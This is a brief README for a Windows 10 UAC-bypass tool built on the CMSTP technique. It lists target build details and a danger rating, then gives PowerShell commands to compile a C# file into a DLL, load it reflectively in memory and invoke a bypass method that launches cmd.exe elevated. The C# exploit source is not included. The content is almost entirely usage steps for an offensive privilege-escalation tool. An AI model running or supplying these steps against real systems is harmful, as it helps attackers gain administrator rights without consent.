# ALNX-1001-CMSTP
Win-UAC-Bypass ALNX-1001-CMSTP

```yaml
TargetOS: Win10
TestedOn: 2004 SO 19041.685
Language: C#/.NET 6.1
Patch: n/a
Danger: 4
Classification: ALNX-1001-CMSTP
```

**_Build_**
```powershell
Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\ALNX1001-Example.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "ALNX-1001-CMSTP.dll"
```

**_Load_**
```powershell
[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\ALNX-1001-CMSTP.dll"))
```

**_Run_**
```powershell
[CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe")
```

